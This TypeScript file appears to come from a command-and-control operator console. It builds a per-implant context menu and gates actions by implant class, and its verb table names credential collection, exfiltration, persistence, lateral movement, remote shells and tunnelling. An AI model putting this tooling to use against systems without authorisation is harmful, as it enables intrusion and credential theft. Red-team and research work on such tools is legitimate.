import type { Implant } from '../api'
import type { MenuEntry, MenuItem } from '../components/ContextMenu'

// The per-implant context menu shared by the fleet table and the session
// console: the capability verbs an operator reaches for, grouped the way the
// categories already group them, each entry gated on the implant's class.

// The class verb table mirrored client-side for menu gating. The server's
// ImplantClassCapabilities (the issuance gate) is the authority; this mirror
// only decides what the menu offers, exactly like the channel-verb mirror --
// the server still refuses anything this table gets wrong.
const CLASS_VERBS: Record<string, readonly string[]> = {
  Stage2: [
    'shell.exec', 'shell.interact', 'file.push', 'file.pull', 'proc.kill',
    'recon.portscan', 'recon.hostenum', 'recon.service', 'recon.ps',
    'lateral.move', 'lateral.token', 'lateral.exec_remote',
    'persist.install', 'persist.remove', 'persist.list',
    'collect.cred', 'collect.screenshot', 'exfil.push', 'exfil.stage',
    'tunnel.forward', 'tunnel.socks',
  ],
  Stager: ['file.pull'],
  WebShell: ['shell.exec'],
  Ephemeral: ['shell.exec'],
  Pivot: ['tunnel.forward', 'tunnel.socks'],
}

export function classVerbs(klass: string): ReadonlySet<string> {
  return new Set(CLASS_VERBS[klass] ?? [])
}

export interface ImplantMenuActions {
  // Open the session console (fleet) or start an interactive shell (console).
  onInteract: () => void
  // Issue a zero-argument verb directly; the caller owns any confirmation.
  onIssue: (verb: string) => void
  // Open the per-verb dialog for an argument-bearing verb.
  onDialog: (verb: string) => void
  onProcesses: () => void
  onNotes?: () => void
  onRetire?: () => void
}

export function implantMenuEntries(implant: Implant, actions: ImplantMenuActions): MenuEntry[] {
  const verbs = classVerbs(implant.class)
  const push = (entry: MenuItem, verb: string) => {
    entry.disabled = !verbs.has(verb) || !!implant.retiredAt
    return entry
  }

  const entries: MenuEntry[] = [
    { kind: 'item', label: 'Interact', icon: 'terminal', onSelect: actions.onInteract },
    { kind: 'sep' },
    { kind: 'label', label: 'Shell' },
    push(
      { kind: 'item', label: 'Run command…', icon: 'terminal', onSelect: () => actions.onDialog('shell.exec') },
      'shell.exec',
    ),
    push(
      { kind: 'item', label: 'Interactive shell', icon: 'terminal', onSelect: actions.onInteract },
      'shell.interact',
    ),
    { kind: 'label', label: 'Files' },
    push(
      { kind: 'item', label: 'Upload…', icon: 'package', onSelect: () => actions.onDialog('file.push') },
      'file.push',
    ),
    push(
      { kind: 'item', label: 'Download…', icon: 'package', onSelect: () => actions.onDialog('file.pull') },
      'file.pull',
    ),
    { kind: 'label', label: 'Processes' },
    push(
      { kind: 'item', label: 'Browse processes', icon: 'list', onSelect: actions.onProcesses },
      'recon.ps',
    ),
    push(
      { kind: 'item', label: 'Kill pid…', icon: 'list', danger: true, onSelect: () => actions.onDialog('proc.kill') },
      'proc.kill',
    ),
    { kind: 'label', label: 'Recon' },
    push(
      { kind: 'item', label: 'Host facts', icon: 'cpu', onSelect: () => actions.onIssue('recon.hostenum') },
      'recon.hostenum',
    ),
    push(
      { kind: 'item', label: 'Port scan…', icon: 'globe', onSelect: () => actions.onDialog('recon.portscan') },
      'recon.portscan',
    ),
    push(
      { kind: 'item', label: 'Probe services…', icon: 'globe', onSelect: () => actions.onDialog('recon.service') },
      'recon.service',
    ),
    { kind: 'label', label: 'Collect' },
    push(
      { kind: 'item', label: 'Screenshot', icon: 'file', onSelect: () => actions.onIssue('collect.screenshot') },
      'collect.screenshot',
    ),
    push(
      { kind: 'item', label: 'Credentials…', icon: 'users', onSelect: () => actions.onDialog('collect.cred') },
      'collect.cred',
    ),
    { kind: 'label', label: 'Persistence' },
    push(
      { kind: 'item', label: 'List', icon: 'list', onSelect: () => actions.onIssue('persist.list') },
      'persist.list',
    ),
    push(
      { kind: 'item', label: 'Install…', icon: 'clock', onSelect: () => actions.onDialog('persist.install') },
      'persist.install',
    ),
    push(
      { kind: 'item', label: 'Remove…', icon: 'clock', onSelect: () => actions.onDialog('persist.remove') },
      'persist.remove',
    ),
  ]
  if (actions.onNotes || (actions.onRetire && !implant.retiredAt)) {
    entries.push({ kind: 'sep' })
    if (actions.onNotes) {
      entries.push({ kind: 'item', label: 'Notes', icon: 'list', onSelect: actions.onNotes })
    }
    if (actions.onRetire && !implant.retiredAt) {
      entries.push({
        kind: 'item',
        label: 'Retire (burn)…',
        icon: 'logout',
        danger: true,
        onSelect: actions.onRetire,
      })
    }
  }
  return entries
}
